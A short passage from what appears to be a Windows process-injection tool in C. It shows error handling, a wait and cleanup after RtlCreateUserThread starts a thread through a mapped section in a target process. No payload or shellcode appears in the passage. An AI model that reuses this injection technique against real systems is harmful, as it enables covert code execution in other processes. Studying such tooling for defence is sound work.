    {
        fprintf(stderr, "[!] Error: RtlCreateUserThread failed. NTSTATUS: 0x%lx\n", ntStatus);
        CloseHandle(targetHandle);
        UnmapViewOfFile(remoteSectionAddress);
        UnmapViewOfFile(localSectionAddress);
        CloseHandle(sectionHandle);
        VirtualFree(buffer, 0, MEM_RELEASE);
        FreeLibrary(hNTDLL);
        return EXIT_FAILURE;
    }
    printf("[+] Successfuly created user thread at ID: 0x%p\n", targetHandle);

    WaitForSingleObject(targetThreadHandle, INFINITE);

    CloseHandle(targetThreadHandle);
    CloseHandle(targetHandle);
    UnmapViewOfFile(remoteSectionAddress);
    UnmapViewOfFile(localSectionAddress);
    CloseHandle(sectionHandle);
    VirtualFree(buffer, 0, MEM_RELEASE);
    FreeLibrary(hNTDLL);

    return 0;

